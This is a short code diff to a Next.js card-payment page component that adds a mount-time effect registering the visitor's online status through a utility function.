@@ -2,7 +2,7 @@
 
 import type React from "react"
 
-import { useState } from "react"
+import { useEffect, useState } from "react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
@@ -12,6 +12,7 @@ import { Menu, CreditCard, Shield } from "lucide-react"
 import Link from "next/link"
 import { useRouter } from "next/navigation"
 import { addData } from "@/lib/firebase"
+import { setupOnlineStatus } from "@/lib/utils"
 
 export default function CardPayment() {
   const router = useRouter()
@@ -39,6 +40,9 @@ export default function CardPayment() {
     }
     return "anonymous-user";
   };
+  useEffect(()=>{
+    setupOnlineStatus(getVisitorId());
+  },[])
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
     // Simulate payment processing
